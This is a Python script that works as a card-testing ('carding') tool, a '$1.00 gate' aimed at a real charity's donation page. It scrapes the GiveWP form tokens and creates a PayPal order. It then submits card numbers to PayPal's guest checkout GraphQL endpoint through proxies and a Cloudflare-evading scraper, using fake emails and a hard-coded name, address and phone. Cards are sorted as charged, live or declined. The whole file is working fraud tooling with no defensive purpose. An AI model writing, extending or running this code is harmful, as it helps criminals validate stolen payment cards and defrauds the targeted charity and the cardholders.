import cloudscraper
import requests
import json
import re
import random
import string
import asyncio
import uuid

def _generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    return f"{name}@{random.choice(domains)}"

def _detect_card_brand(cc):
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    formatted = None
    if ps.startswith(("http://", "https://", "socks5://", "socks4://", "socks5h://", "socks4a://")):
        formatted = ps
    else:
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit(): formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif parts[3].isdigit(): formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
            else: formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2: formatted = f"http://{parts[0]}:{parts[1]}"
        else: formatted = f"http://{ps}"

    if formatted.startswith("socks5://"):
        formatted = formatted.replace("socks5://", "socks5h://")
    elif formatted.startswith("socks4://"):
        formatted = formatted.replace("socks4://", "socks4a://")

    return formatted

def check_card_paypal_aww_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    """
    PayPal Commerce $1.00 Gate (awwatersheds.org).
    Flow:
    1. GET /donate/ (extract Give form hash and IDs)
    2. POST /wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order
    3. POST https://www.paypal.com/graphql?OnboardGuestMutation
    Returns: (status, message, brand)
    """
    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)

    brand = _detect_card_brand(cc)
    formatted_proxy = _format_proxy(proxy_url)
    email = _generate_email()
    first_name = "Tommy"
    last_name = "Walid"

    s = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
    )
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })

    if formatted_proxy:
        s.proxies = {'http': formatted_proxy, 'https': formatted_proxy}

    try:
        # Step 1: GET donation page to extract form hash & IDs
        r_page = s.get('https://awwatersheds.org/donate/', timeout=15)
        if r_page.status_code != 200:
            return "declined", f"Failed to reach donation page ({r_page.status_code})", brand

        hash_match = re.search(r'name="give-form-hash".*?value="([^"]+)"', r_page.text)
        form_hash = hash_match.group(1) if hash_match else '0157d4db02'

        form_prefix_match = re.search(r'name="give-form-id-prefix".*?value="([^"]+)"', r_page.text)
        form_prefix = form_prefix_match.group(1) if form_prefix_match else '4572-1'

        form_id_match = re.search(r'name="give-form-id".*?value="([^"]+)"', r_page.text)
        form_id = form_id_match.group(1) if form_id_match else '4572'

        # Step 2: Create PayPal Commerce Order
        params_order = {'action': 'give_paypal_commerce_create_order'}
        headers_ajax = {
            'Origin': 'https://awwatersheds.org',
            'Referer': 'https://awwatersheds.org/donate/'
        }
        files_order = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, form_prefix),
            'give-form-id': (None, form_id),
            'give-form-title': (None, 'Donate Now'),
            'give-current-url': (None, 'https://awwatersheds.org/donate/'),
            'give-form-url': (None, 'https://awwatersheds.org/donate/'),
            'give-form-minimum': (None, '1'),
            'give-form-maximum': (None, '1000000'),
            'give-form-hash': (None, form_hash),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, '1'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, first_name),
            'give_last': (None, last_name),
            'give_email': (None, email),
            'give_comment': (None, ''),
            'give_lake_affiliation': (None, 'Lovell Lake'),
            'give_lake_affiliation_other': (None, ''),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        }

        r_order = s.post('https://awwatersheds.org/wp-admin/admin-ajax.php', params=params_order, headers=headers_ajax, files=files_order, timeout=15)
        try:
            order_json = r_order.json()
            order_id = order_json.get('data', {}).get('id') or order_json.get('id')
        except Exception:
            order_match = re.search(r'([A-Z0-9]{17})', r_order.text)
            order_id = order_match.group(1) if order_match else None

        if not order_id:
            return "declined", "Failed to create PayPal Order ID", brand

        # Step 3: Pay with card via PayPal GraphQL OnboardGuestMutation
        fraudnet_session_id = uuid.uuid4().hex
        headers_paypal = {
            'Accept': '*/*',
            'Content-Type': 'application/json',
            'Origin': 'https://www.paypal.com',
            'Referer': 'https://www.paypal.com/smart/card-fields',
            'Paypal-Client-Context': order_id,
            'paypal-client-metadata-id': fraudnet_session_id,
            'X-Requested-With': 'XMLHttpRequest',
            'X-App-Name': 'standardcardfields',
            'X-Country': 'US',
        }

        graphql_payload = {
            'operationName': 'OnboardGuestMutation',
            'variables': {
                'card': {
                    'cardNumber': cc,
                    'expirationDate': f"{mm}/{yy}",
                    'securityCode': cvc,
                    'type': brand,
                },
                'country': 'US',
                'email': email,
                'firstName': first_name,
                'lastName': last_name,
                'phone': {'countryCode': '1', 'number': '5159662869', 'type': 'MOBILE'},
                'token': order_id,
                'billingAddress': {
                    'line1': '8872 SE Vandalia Dr',
                    'city': 'Runnells',
                    'state': 'IA',
                    'postalCode': '50237',
                    'country': 'US',
                    'familyName': last_name,
                    'givenName': first_name,
                },
                'shippingAddress': {
                    'line1': '',
                    'city': '',
                    'state': '',
                    'postalCode': '',
                    'accountQuality': {
                        'autoCompleteType': 'MANUAL',
                        'isUserModified': False,
                    },
                    'country': 'US',
                    'familyName': first_name,
                    'givenName': last_name,
                },
                'crsData': None,
            },
            'query': '''mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String!, $lastName: String!, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $token: String!) {
  onboardAccount: onboardGuest(
    bank: $bank
    billingAddress: $billingAddress
    card: $card
    country: $country
    currencyConversionType: $currencyConversionType
    dateOfBirth: $dateOfBirth
    email: $email
    firstName: $firstName
    lastName: $lastName
    phone: $phone
    shareAddressWithDonatee: $shareAddressWithDonatee
    shippingAddress: $shippingAddress
    token: $token
  ) {
    buyer {
      auth {
        accessToken
        __typename
      }
      userId
      __typename
    }
    flags {
      is3DSecureRequired
      __typename
    }
  }
}'''
        }

        r_pay = s.post('https://www.paypal.com/graphql?OnboardGuestMutation', headers=headers_paypal, json=graphql_payload, timeout=20)
        try:
            pay_res = r_pay.json()
        except Exception:
            pay_res = {}
        res_text = json.dumps(pay_res)

        errors = pay_res.get('errors', [])
        data_obj = pay_res.get('data') or {}
        onboard_acc = data_obj.get('onboardAccount')

        if onboard_acc and isinstance(onboard_acc, dict):
            buyer = onboard_acc.get('buyer') or {}
            auth = buyer.get('auth') or {}
            flags = onboard_acc.get('flags') or {}
            if flags.get('is3DSecureRequired'):
                return "live", "3D Secure Required (Card Live)", brand
            if auth.get('accessToken') and not errors:
                return "charged", "Charge Successful ($1.00)", brand

        # Parse Errors & Declined States
        res_upper = res_text.upper()
        if "INSUFFICIENT_FUNDS" in res_upper or "INSUFFICIENT" in res_upper:
            return "live", "Insufficient Funds", brand
        elif "INVALID_SECURITY_CODE" in res_upper or "CVV" in res_upper or "CVC" in res_upper:
            return "live", "Security code is incorrect (CCN Live)", brand
        elif "GUEST_CARD_COUNTRY_MISMATCH" in res_upper:
            return "live", "Card Approved (Country Mismatch)", brand
        elif "IS3DSECUREREQUIRED" in res_upper and "TRUE" in res_upper:
            return "live", "3D Secure Required", brand
        elif "CARD_GENERIC_ERROR" in res_upper or "ISSUER_DECLINE" in res_upper or "DO_NOT_HONOR" in res_upper:
            return "declined", "Card Declined by Issuer", brand
        elif "EXPIRED" in res_upper:
            return "declined", "Card Expired", brand
        elif "FRAUD" in res_upper or "STOLEN" in res_upper or "LOST" in res_upper:
            return "declined", "Card Declined - Fraud / Stolen", brand
        else:
            if errors and isinstance(errors, list):
                err_code = errors[0].get('errorData', {}).get('0', {}).get('code')
                err_msg = errors[0].get('message') or err_code or "Card Declined"
                if err_code:
                    return "declined", f"Declined - {err_code}", brand
                return "declined", f"Declined - {err_msg}", brand
            return "declined", "Payment declined.", brand

    except requests.exceptions.ProxyError:
        return "error", "Proxy connection failed (Dead or invalid proxy)", "N/A"
    except requests.exceptions.ConnectionError as e:
        err_s = str(e)
        if "502" in err_s or "Bad Gateway" in err_s or "ProxyError" in err_s:
            return "error", "Proxy connection failed (502 Bad Gateway)", "N/A"
        return "error", "Network connection failed", "N/A"
    except requests.exceptions.Timeout:
        return "error", "Connection timed out", "N/A"
    except Exception as e:
        err_str = str(e)
        if "502" in err_str or "Bad Gateway" in err_str or "ProxyError" in err_str:
            return "error", "Proxy connection failed (502 Bad Gateway)", "N/A"
        return "error", f"Error: {err_str[:60]}", "N/A"

async def check_card_paypal_aww(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    """
    Async interface for PayPal Commerce $1.00 Gate.
    """
    return await asyncio.to_thread(check_card_paypal_aww_sync, cc, mm, yy, cvc, proxy_url=proxy_url)
